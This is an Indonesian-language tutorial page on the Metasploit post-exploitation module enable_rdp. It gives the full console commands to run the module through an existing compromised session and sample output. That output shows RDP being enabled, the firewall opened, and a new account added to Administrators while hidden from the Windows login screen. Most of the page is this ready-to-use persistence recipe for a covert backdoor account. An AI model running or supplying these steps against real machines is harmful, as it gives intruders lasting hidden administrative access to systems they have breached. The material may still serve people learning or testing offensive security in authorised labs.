# enable_rdp

Modul `enable_rdp` di Metasploit adalah modul `post-exploitation` untuk sistem Windows yang digunakan untuk mengaktifkan fitur Remote Desktop Protocol (RDP) pada komputer target. Modul ini bekerja setelah akses ke sistem berhasil diperoleh (misalnya via meterpreter) dan akan melakukan perubahan pada registry serta konfigurasi sistem untuk mengizinkan koneksi `RDP`, sehingga memungkinkan penyerang untuk mengakses desktop target secara langsung melalui Remote Desktop setelah mendapatkan kredensial yang sesuai.

## Cara Penggunaan di Metasploit

```
use post/windows/manage/enable_rdp
set ENABLE true
set FORWARD false
set LPORT 3389
set PASSWORD <PASSWORD>
set SESSION <ID>
set USERNAME <USERNAME>
set VERBOSE true
run
```

Hasil output-nya seperti ini:

```
[*] Enabling Remote Desktop
[*] 	RDP is already enabled
[*] Setting Terminal Services service startup mode
[*] 	Terminal Services service is already set to auto
[*] 	Opening port in local firewall if necessary
[*] Setting user account for logon
[*] 	Adding User: fixploit03 with Password: fixploit03
[*] 	Adding User: fixploit03 to local group 'Remote Desktop Users'
[*] 	Hiding user from Windows Login screen
[*] 	Adding User: fixploit03 to local group 'Administrators'
[*] You can now login with the created user
[*] For cleanup execute Meterpreter resource file: /root/.msf4/loot/20250516221529_default_192.168.1.52_host.windows.cle_571851.txt
[*] Post module execution completed
```
